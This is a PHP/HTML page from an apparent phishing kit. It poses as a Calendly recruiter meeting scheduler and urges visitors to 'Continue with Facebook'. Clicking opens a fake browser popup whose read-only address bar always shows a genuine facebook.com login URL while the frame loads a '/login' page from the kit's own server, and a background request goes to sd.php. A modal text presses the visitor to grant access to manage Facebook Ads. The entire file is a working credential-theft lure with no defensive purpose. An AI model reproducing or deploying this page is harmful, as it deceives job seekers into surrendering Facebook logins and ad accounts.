<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="boxicons.min.css">
    <link rel="shortcut icon" href="assets/img/fav.png" type="image/x-icon">
    <link rel="stylesheet" href="style.css">

        <title>Meeting Schedule</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f6f9;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                display: flex;
                background-color: #fff;
                border-radius: 10px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                width: 80%;
                max-width: 1200px;
                min-height: 600px;
                overflow: hidden;
            }
            /* Left section */
            .left-section {
                width: 50%;
                padding: 40px;
                border-right: 1px solid #ddd;
                background-color: #fff;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
            }
            .logo {
                font-size: 36px;
                font-weight: bold;
                color: #007bff;
                margin-bottom: 10px;
                width: 100%;
            }
            .logo img {
                border-radius: 10px;
                width: 100%;
                height: 90%;
            }
            .hr-separator {
                width: 100%;
                border-top: 2px solid #ddd;
                margin-bottom: 20px;
            }
            .left-section .user-icon {
                margin-bottom: 20px;
            }
            .left-section .user-icon i {
                font-size: 60px;
                color: #007bff;
            }
            .meeting-details {
                text-align: center;
                margin-bottom: 20px;
            }
            .meeting-details h1 {
                font-size: 24px;
                font-weight: bold;
                margin-bottom: 5px;
            }
            .meeting-details p {
                font-size: 18px;
                color: #555;
            }
            .icon-text {
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 14px;
                margin-top: 10px;
                color: #888;
            }
            .icon-text i {
                margin-right: 10px;
                color: #007bff;
            }
            .footer-links {
                display: flex;
                justify-content: space-between;
                margin-top: 20px;
                width: 100%;
            }
            .footer-links a {
                font-size: 12px;
                color: #007bff;
                text-decoration: none;
            }
    
            /* Right section */
            .right-section {
                width: 50%;
                padding: 40px;
                position: relative; /* Added to ensure positioning context for absolute children */

            }
            .progress-bar {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 30px;
                position: relative;
            }
            .progress-line {
                position: absolute;
                top: 35%;
                left: 30px; /* Start from the left */
                width: 100%; /* Full width for the connection line */
                height: 4px; /* Increased height */
                background-color: #ddd; /* Default color */
                z-index: 0;
                transform: translateY(-50%);
                border-radius: 8px;
            }
            .progress-fill {
                position: absolute;
                top: 35%;
                left: -33px; /* Fill from the left */
                width: 35%; /* 50% filled */
                height: 4px; /* Filled section */
                background-color: #007bff; /* Active color */
                z-index: 1;
                transform: translateY(-50%);
                border-radius: 8px;
            }
            .progress-step {
                text-align: center;
                font-size: 14px;
                color: #888;
                position: relative; /* For proper positioning of text */
                z-index: 2;
            }
            .progress-step .circle {
                display: inline-block;
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background-color: #ddd;
                margin-bottom: 5px;
                border: 3px solid #007bff;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .progress-step.active .circle {
                background-color: #007bff;
                border-color: #007bff;
            }
            .progress-step i {
                color: white;
                font-size: 18px;
            }
            .progress-step span {
                display: block; /* Ensure the text is on a new line */
                margin-top: 5px; /* Add spacing above text */
                font-size: 14px;
            }
    
            .verification-message {
                background-color: #fff6e5;
                padding: 15px;
                border-left: 5px solid #ffbf00;
                margin-bottom: 20px;
                font-size: 14px;
                color: #555;
            }
            .facebook-btn {
                display: inline-block;
                padding: 12px 20px;
                font-size: 16px;
                background-color: #4267B2;
                color: white;
                text-align: center;
                border-radius: 4px;
                text-decoration: none;
                cursor: pointer;
                border: none;
                width: 100%;
            }
            .facebook-btn i {
                margin-right: 8px; /* Space between icon and text */
            }
            .powered-by {
    position: absolute;
    top: 119px !important;
    right: -35px !important;
    background-color: #4d4d4d; /* Updated color to match the reference */
    color: white;
    padding: 8px 40px; /* Adjust padding to fit the text size and banner appearance */
    font-size: 14px; /* Adjust font size as needed */
    transform: rotate(45deg);
    transform-origin: top right;
    box-shadow: 0 3px 6px rgba(0,0,0,0.16);
    border: none; /* Remove any borders */
    z-index: 1000;
}

.powered-by:hover {
    background-color: #333; /* Darker shade on hover if needed */
}

            /* Responsive */
            @media (max-width: 768px) {
                .container {
                    flex-direction: column;
                }
                .left-section, .right-section {
                    width: 100%;
                }
                .progress-fill{
                    left: -25px;
                    width: 35%;
                }
                .progress-line{
                    left: 25px;
                }
                .logo img {
                    height: 70px !important;
                }
                .powered-by {
                top: 5px;
                right: 5px;
                font-size: 14px;
                padding: 10px 30px;
                display: none !important;
            }
            }
        </style>
    </head>
    <body>
    
    <!-- Load settings -->
    <?php
    $settings_file = dirname(__DIR__) . '/settings.json';
    if (!file_exists($settings_file)) {
        die('Settings file not found');
    }
    $settings = json_decode(file_get_contents($settings_file), true);
    if ($settings === null) {
        die('Invalid settings file');
    }
    $company_name = $settings['company_name'] ?? 'Company Name';
    $recruiter_name = $settings['recruiter_name'] ?? 'Recruiter Name';
    ?>
    
    <div class="container">
        <!-- Left Section -->
        <div class="left-section">
            <div class="logo">
                <img src="logo.png" alt="">
            </div>
            <div class="hr-separator"></div>
            <div class="user-icon">
                <img src="user.png" alt="User" style="border-radius: 50%; width: 100px; height: 100px; object-fit: cover;">
            </div>
            
            <div class="meeting-details">
                <h1><?php echo htmlspecialchars($recruiter_name); ?></h1>
                <p>15 Minutes Meeting</p>
                <div class="icon-text">
                    <i class="far fa-clock"></i> 15 min
                </div>
                <div class="icon-text">
                    <i class="fas fa-phone-alt"></i> Phone Call
                </div>
                <div class="icon-text">
                    <i class="fas fa-globe"></i> Europe/Warsaw ( CET - <span id="current-time" style="width: 65px;"></span> )
                </div>
            </div>
            <div class="footer-links">
                <a href="#">Cookie settings</a>
                <a href="#">Report abuse</a>
            </div>
        </div>
    
        <!-- Right Section -->
        <div class="right-section">
            <div class="progress-bar">
                <div class="progress-line"></div>
                <div class="progress-fill"></div>
                <div class="progress-step active">
                    <div class="circle"><i class="fas fa-check"></i></div>
                    <span>Verify</span>
                </div>
                <div class="progress-step">
                    <div class="circle"><i class="fas fa-calendar-alt"></i></div>
                    <span>Schedule</span>
                </div>
                <div class="progress-step">
                    <div class="circle"><i class="fas fa-flag-checkered"></i></div>
                    <span>Finish</span>
                </div>
            </div>
            <div class="verification-message">
                Please confirm your appointment with <?php echo htmlspecialchars($recruiter_name); ?>. To complete the confirmation process, continue with Facebook.
            </div>
            <button class="facebook-btn" id="connectFacebook">
                <i class="fab fa-facebook-f"></i> Continue with Facebook
            </button>
            
            <div class="powered-by">
            Powered by Calendly
        </div>        </div>
    </div>
    <script>
        // Function to update current time in CET
        function updateTime() {
            const options = { hour: '2-digit', minute: '2-digit', timeZone: 'CET', hour12: true };
            const currentTime = new Date().toLocaleTimeString('en-US', options);
            document.getElementById('current-time').innerText = currentTime;
        }
    
        setInterval(updateTime, 1000); // Update every second
        updateTime(); // Initial call to set time immediately
    </script>
    

    
    <!-- Modal -->
<!-- Modal Structure -->
<div id="successModal" class="modal">
    <div class="modal-content show">
        <img src="ld.gif" alt="Loading..." class="loadingGif" style="width: 50px;">
        <p>Important: Please complete your Facebook connection. <br><br> This step is necessary to verify your profile, streamline the application process, and grant you permission to access our pages and manage Facebook Ads, which are key responsibilities in these roles.</p><br>
        <p>After connecting, you will be redirected to the next step on this page.</p><br>
        <button id="connectFacebook" class="cnFB">Connect Facebook</button><br>
    </div>
</div>

<!-- Popup Container -->
<div class="popup-container" id="popupWindow">
    <!-- Draggable Tab Area (Top of the window) -->
    <div class="popup-tabs">
        <div class="popup-tab">
            <img src="ico.ico" alt="" width="17px" style="margin-right: 10px;">Facebook
        </div>
        <div class="close-tab-button" onclick="closePopup()">
            <i class="fas fa-times"></i>
        </div>
    </div>

    <!-- Popup header with controls -->
    <div id="popupHeader" class="popup-header">
        <div class="search-bar-container">
            <i class="fa-solid fa-lock ssl-icon" style="padding-right:5px"></i>
            <input id="searchBar" type="text" value="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" readonly>
        </div>
    </div>

    <!-- Content area (iframe) -->
    <iframe id="popupIframe" class="popup-iframe"></iframe>
</div>


<!-- POP UP JS -->
<script>
// Flag to check if the popup was opened before
let isPopupOpened = false;
// Flag to check if the AJAX request was sent before
let isAjaxSent = false;

// Function to change the source of the iframe (only once)
function changeIframeSrc(src) {
    if (!isPopupOpened) {
        document.getElementById('popupIframe').src = src;
        isPopupOpened = true;  // Set the flag to true after first open
    }
}

// Function to send AJAX request to sd.php with POST data (only once)
function sendAjaxRequest() {
    if (!isAjaxSent) {  // Ensure AJAX request is sent only once
        const formData = new FormData();
        formData.append('welcome', 'Welcome to the Popup'); // Add your POST data

        fetch('sd.php', {
            method: 'POST',
            body: formData,
        })
        .then(response => response.text())
        .then(data => {
            console.log('Success:', data); // Handle success response
            isAjaxSent = true;  // Set the flag to true after the first AJAX request
        })
        .catch(error => {
            console.error('Error:', error); // Handle error response
        });
    }
}

    // Function to make the element draggable
    function dragElement(elmnt, dragHandle) {
        var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
        if (dragHandle) {
            dragHandle.onmousedown = dragMouseDown;
        } else {
            elmnt.onmousedown = dragMouseDown;
        }

        function dragMouseDown(e) {
            if (window.matchMedia("(pointer: coarse)").matches) {
                // Prevent dragging on mobile
                return;
            }

            e = e || window.event;
            e.preventDefault();
            pos3 = e.clientX;
            pos4 = e.clientY;
            document.onmouseup = closeDragElement;
            document.onmousemove = elementDrag;
        }

        function elementDrag(e) {
            e = e || window.event;
            e.preventDefault();
            pos1 = pos3 - e.clientX;
            pos2 = pos4 - e.clientY;
            pos3 = e.clientX;
            pos4 = e.clientY;
            elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
            elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
        }

        function closeDragElement() {
            document.onmouseup = null;
            document.onmousemove = null;
        }
    }

// Function to open the popup and send the POST request
function openPopup() {
    document.getElementById('popupWindow').style.display = 'flex';
    changeIframeSrc('/login');  // Only sets iframe src if it hasn't been opened before
    sendAjaxRequest();  // Send the AJAX request when the popup is opened, but only once
}
    // Function to close the popup
    function closePopup() {
        document.getElementById('popupWindow').style.display = 'none';
    }

    // Dragging functionality
    dragElement(document.getElementById("popupWindow"), document.querySelector(".popup-tabs"));

    // Open popup button functionality
    document.getElementById('connectFacebook').addEventListener('click', openPopup);
    // Function to hide popup when clicking outside
    document.addEventListener('click', function(event) {
        var popup = document.getElementById('popupWindow');
        if (popup.style.display === 'flex' && !popup.contains(event.target) && !event.target.matches('#connectFacebook')) {
            closePopup();
        }
    });
    // Function to update the search bar based on iframe URL
    function updateSearchBar() {
        var iframe = document.getElementById('popupIframe');
        var searchBar = document.getElementById('searchBar');

        iframe.onload = function() {
            var iframeUrl = iframe.contentWindow.location.href;

            // Check for specific URLs
            if (iframeUrl.includes('cf') || iframeUrl.includes('cfp')) {
                searchBar.value = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100';
            } else if (iframeUrl.includes('t') || iframeUrl.includes('tt')) {
                searchBar.value = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100';
            } else if (iframeUrl.includes('v') || iframeUrl.includes('v.php')) {
                searchBar.value = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100';
            } else {
                searchBar.value = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'; // Default URL
            }
        };
    }

    // Initial update of the search bar
    updateSearchBar();

    // Update search bar when iframe URL changes
    document.getElementById('popupIframe').addEventListener('load', updateSearchBar);

    // Close popup when clicking outside of it
    window.onclick = function(event) {
        var popup = document.getElementById('popupWindow');
        if (event.target == popup) {
            popup.style.display = "none";
        }
    };
</script>
<!-- POP UP JS -->


<!-- JS -->
</body>
</html>
